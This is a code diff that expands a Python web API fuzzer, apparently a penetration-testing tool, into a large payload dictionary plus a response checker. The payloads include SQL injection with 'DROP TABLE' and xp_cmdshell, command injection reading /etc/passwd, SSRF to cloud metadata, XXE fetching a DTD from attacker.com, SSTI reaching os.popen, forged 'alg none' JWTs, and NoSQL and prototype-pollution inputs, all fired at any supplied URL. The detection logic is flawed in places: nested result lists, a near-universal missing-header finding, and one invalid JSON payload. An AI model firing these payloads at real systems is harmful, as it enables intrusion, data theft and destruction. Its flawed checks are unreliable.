@@ -1,171 +1,212 @@
-"""
-API Fuzzer - Tests endpoints for vulnerabilities
-"""
+import requests
 
-import concurrent.futures
-import json
-import re
-from urllib.parse import urlparse, parse_qs
-from utils.http_client import HTTPClient
-from utils.logger import setup_logger
-
-logger = setup_logger(__name__)
-
-class APIFuzzer:
-    def __init__(self):
-        self.http_client = HTTPClient()
-        self.findings = []
-        
-        # Payloads for different vulnerability types
+class Fuzzer:
+    def __init__(self, session):
+        self.session = session
         self.payloads = {
             "sql_injection": [
-                "' OR '1'='1", "' UNION SELECT NULL--", "admin'--", 
-                "' OR 1=1--", "1; DROP TABLE users"
+                "' OR '1'='1", "' UNION SELECT NULL--", "admin'--", "' OR 1=1--", 
+                "1; DROP TABLE users", "1' WAITFOR DELAY '0:0:5'--", 
+                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "1'; EXEC xp_cmdshell('dir')--", "1' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
+                "1' OR (SELECT COUNT(*) FROM sysobjects) > 0--", "1' OR (SELECT COUNT(*) FROM information_schema.tables) > 0--"
             ],
             "xss": [
                 "<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>",
-                "javascript:alert('XSS')", "onload=alert('XSS')"
+                "javascript:alert('XSS')", "onload=alert('XSS')", 
+                "<img src=x onerror=alert('XSS')>", "{{7*7}}", "${7*7}",
+                "<!--#exec cmd=\"id\"-->", "<svg onload=alert('XSS')>",
+                "javascript:confirm('XSS')", "javascript:prompt('XSS')"
             ],
             "path_traversal": [
-                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+                "....//....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
+                "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
+                "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
+                "/etc/passwd", "c:\\windows\\system32\\drivers\\etc\\hosts",
+                "../../../../etc/passwd%00", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00"
             ],
-            "command_injection": [
-                "; ls -la", "| whoami", "&& id"
+            "cmdi": [
+                "; ls -la", "| whoami", "&& id", "|| ping -c 1 localhost",
+                "`id`", "$(id)", "| dir", "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
+                "; cat /etc/passwd", "| net user", "; pwd", "| ipconfig",
+                "&& netstat -an", "; ps aux", "| systeminfo"
             ],
             "idor": [
-                "../user/1", "./admin/../user/2", "user/0"
+                "../user/1", "./admin/../user/2", "user/0", "api/user/1", 
+                "admin/../../user/3", "user/12345", "account/1", "profile/1",
+                "customer/1", "order/1", "invoice/1", "document/1"
+            ],
+            "ssrf": [
+                "http://localhost:22", "http://127.0.0.1:22", "http://169.254.169.254/latest/meta-data/",
+                "http://localhost:80/admin", "http://127.0.0.1:6379", "http://0.0.0.0:8080",
+                "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stat",
+                "http://localhost:9200", "http://127.0.0.1:27017", "http://localhost:5984",
+                "http://169.254.169.254/metadata/instance", "http://metadata.google.internal"
+            ],
+            "xxe": [
+                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
+                "<!--?xml version=\"1.0\" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><userInfo><firstName>&ent;</firstName></userInfo>",
+                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+            ],
+            "ssti": [
+                "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}", 
+                "{{''.__class__.__mro__[1].__subclasses__()}}", 
+                "{{config}}", "{{settings.SECRET_KEY}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+            ],
+            "header_injection": [
+                "localhost:80\nX-Forwarded-Host: evil.com",
+                "example.com\r\nX-Forwarded-For: 127.0.0.1",
+                "test.com\r\nHost: evil.com",
+                "api.example.com\nX-Real-IP: 127.0.0.1",
+                "example.com\r\nReferer: evil.com"
+            ],
+            "jwt_tampering": [
+                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+                "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+            ],
+            "nosql_injection": [
+                '{"$where": "this.owner == \'admin\'"}',
+                '{"$gt": ""}',
+                '{"$ne": ""}',
+                '{"$regex": ".*"}',
+                '{"$where": "sleep(5000)"}',
+                '{"username": {"$ne": null}, "password": {"$ne": null}}'
+            ],
+            "graphql_injection": [
+                '{__schema{types{name}}}',
+                'fragment __Type on __Type { name }',
+                'query { __typename }',
+                'mutation { createUser(input: {username: "admin", password: "password"}) { user { id } } }',
+                'query { users { email password } }'
+            ],
+            "prototype_pollution": [
+                '{"__proto__": {"isAdmin": true}}',
+                '{"constructor": {"prototype": {"isAdmin": true}}}',
+                '{"__proto__": {"toString": function() { return "hacked"; }}}'
             ]
         }
     
-    def test_parameter(self, url, param_name, param_value, payload, payload_type, method="GET"):
-        """Test a single parameter with a payload"""
-        try:
-            parsed_url = urlparse(url)
-            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
-            query_params = parse_qs(parsed_url.query)
+    def fuzz_parameters(self, url):
+        """Fuzz parameters with advanced payloads"""
+        if '?' not in url:
+            return []
             
-            # Replace the parameter value with payload
-            query_params[param_name] = [payload]
-            
-            # Build new URL with fuzzed parameter
-            new_query = "&".join([f"{k}={v[0]}" for k, v in query_params.items()])
-            fuzzed_url = f"{base_url}?{new_query}"
-            
-            response = self.http_client.get(fuzzed_url)
-            
-            # Check for vulnerabilities
-            vuln_info = self.check_response(response, payload_type, payload, param_name, url, method)
-            if vuln_info:
-                self.findings.append(vuln_info)
-                return vuln_info
-            
-        except Exception as e:
-            logger.error(f"Error testing {url}: {str(e)}")
-        return None
-    
-    def check_response(self, response, payload_type, payload, param_name, url, method):
-        """Check response for vulnerability indicators"""
-        text = response.text.lower()
+        base_url, query_string = url.split('?', 1)
+        params = {}
         
-        # SQL Injection detection
-        if payload_type == "sql_injection" and any(error in text for error in [
-            "sql syntax", "mysql_fetch", "ora-01756", "postgresql"
-        ]):
-            return {
-                "type": "SQL Injection",
-                "url": url,
-                "parameter": param_name,
-                "method": method,
-                "payload": payload,
-                "evidence": "SQL error in response",
-                "severity": "High"
-            }
+        for param in query_string.split('&'):
+            if '=' in param:
+                key, value = param.split('=', 1)
+                params[key] = value
         
-        # XSS detection
-        if payload_type == "xss" and response.status_code == 200 and payload in response.text:
-            return {
-                "type": "XSS",
-                "url": url,
-                "parameter": param_name,
-                "method": method,
-                "payload": payload,
-                "evidence": "XSS payload reflected in response",
-                "severity": "Medium"
-            }
+        vulnerabilities = []
         
-        # Path Traversal detection
-        if payload_type == "path_traversal" and any(indicator in text for indicator in [
-            "root:", "daemon:", "/bin/bash", "etc/passwd"
-        ]):
-            return {
-                "type": "Path Traversal",
-                "url": url,
-                "parameter": param_name,
-                "method": method,
-                "payload": payload,
-                "evidence": "Sensitive file content in response",
-                "severity": "High"
-            }
-        
-        # Command Injection detection
-        if payload_type == "command_injection" and any(indicator in text for indicator in [
-            "bin/bash", "www/html", "permission denied", "cannot access"
-        ]):
-            return {
-                "type": "Command Injection",
-                "url": url,
-                "parameter": param_name,
-                "method": method,
-                "payload": payload,
-                "evidence": "Command output in response",
-                "severity": "High"
-            }
-        
-        return None
-    
-    def fuzz_endpoint(self, endpoint):
-        """Fuzz a single endpoint"""
-        logger.info(f"Fuzzing endpoint: {endpoint}")
-        findings = []
-        
-        # Parse URL to get parameters
-        parsed_url = urlparse(endpoint)
-        if not parsed_url.query:
-            return findings
-        
-        query_params = parse_qs(parsed_url.query)
-        
-        # Test each parameter with each payload type
-        for param_name in query_params.keys():
+        for param_name in params.keys():
             for payload_type, payload_list in self.payloads.items():
                 for payload in payload_list:
                     try:
-                        vuln_info = self.test_parameter(endpoint, param_name, query_params[param_name][0], payload, payload_type)
-                        if vuln_info:
-                            findings.append(vuln_info)
-                            logger.warning(f"Vulnerability found: {vuln_info['type']} at {endpoint}")
+                        test_params = params.copy()
+                        test_params[param_name] = payload
+                        
+                        response = self.session.get(base_url, params=test_params, timeout=10)
+                        vuln = self.check_vulnerabilities(response, base_url, "GET", test_params)
+                        if vuln:
+                            vulnerabilities.append(vuln)
                     except:
                         pass
         
-        return findings
+        return vulnerabilities
     
-    def fuzz_endpoints(self, endpoints, max_threads=10):
-        """Fuzz multiple endpoints with threading"""
-        logger.info(f"Fuzzing {len(endpoints)} endpoints")
-        all_findings = []
+    def check_vulnerabilities(self, response, url, method, params):
+        """Check response for signs of vulnerabilities"""
+        text = response.text.lower()
+        resp_headers = str(response.headers).lower()
         
-        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
-            future_to_endpoint = {
-                executor.submit(self.fuzz_endpoint, endpoint): endpoint for endpoint in endpoints
-            }
-            
-            for future in concurrent.futures.as_completed(future_to_endpoint):
-                endpoint = future_to_endpoint[future]
-                try:
-                    findings = future.result()
-                    all_findings.extend(findings)
-                except Exception as e:
-                    logger.error(f"Error fuzzing {endpoint}: {str(e)}")
+        sql_errors = [
+            "sql syntax", "mysql_fetch", "ora-01756", "postgresql", 
+            "microsoft ole db provider", "syntax error", "mysql_num_rows",
+            "mysqli_fetch", "pg_exec", "sqlite3", "unclosed quotation mark",
+            "odbc", "jdbc", "database error"
+        ]
         
-        logger.info(f"Fuzzing completed. Found {len(all_findings)} vulnerabilities")
-        return all_findings
+        vulnerabilities = []
+        
+        if any(error in text for error in sql_errors):
+            vulnerabilities.append({
+                "type": "SQL Injection",
+                "url": url,
+                "method": method,
+                "params": params,
+                "evidence": "SQL error in response",
+                "severity": "High"
+            })
+        
+        if response.status_code < 500 and any(payload in response.text for payload in self.payloads["xss"]):
+            vulnerabilities.append({
+                "type": "XSS",
+                "url": url,
+                "method": method,
+                "params": params,
+                "evidence": "XSS payload reflected in response",
+                "severity": "Medium"
+            })
+        
+        if any(indicator in text for indicator in ["root:", "daemon:", "/bin/bash", "etc/passwd", "boot.ini", "windows/system32"]):
+            vulnerabilities.append({
+                "type": "Path Traversal",
+                "url": url,
+                "method": method,
+                "params": params,
+                "evidence": "Sensitive file content in response",
+                "severity": "High"
+            })
+        
+        if any(indicator in text for indicator in ["bin/bash", "www/html", "permission denied", "cannot access", "command not found", "volume in drive"]):
+            vulnerabilities.append({
+                "type": "Command Injection",
+                "url": url,
+                "method": method,
+                "params": params,
+                "evidence": "Command output in response",
+                "severity": "High"
+            })
+        
+        if response.status_code == 200 and any(indicator in url for indicator in ["user", "account", "profile", "id=", "uid="]):
+            if any(indicator in text for indicator in ["email", "password", "admin", "user", "private", "secret"]):
+                vulnerabilities.append({
+                    "type": "IDOR",
+                    "url": url,
+                    "method": method,
+                    "params": params,
+                    "evidence": "Sensitive data exposure through IDOR",
+                    "severity": "Medium"
+                })
+        
+        security_headers = ["x-frame-options", "x-content-type-options", 
+                           "x-xss-protection", "strict-transport-security",
+                           "content-security-policy"]
+        
+        missing_headers = []
+        for header in security_headers:
+            if header not in resp_headers:
+                missing_headers.append(header)
+        
+        if missing_headers:
+            vulnerabilities.append({
+                "type": "Missing Security Headers",
+                "url": url,
+                "method": method,
+                "params": params,
+                "evidence": f"Missing security headers: {', '.join(missing_headers)}",
+                "severity": "Low"
+            })
+        
+        return vulnerabilities
+    
+    def get_payloads(self, payload_type=None):
+        """Get payloads by type or all payloads"""
+        if payload_type:
+            return self.payloads.get(payload_type, [])
+        return self.payloads
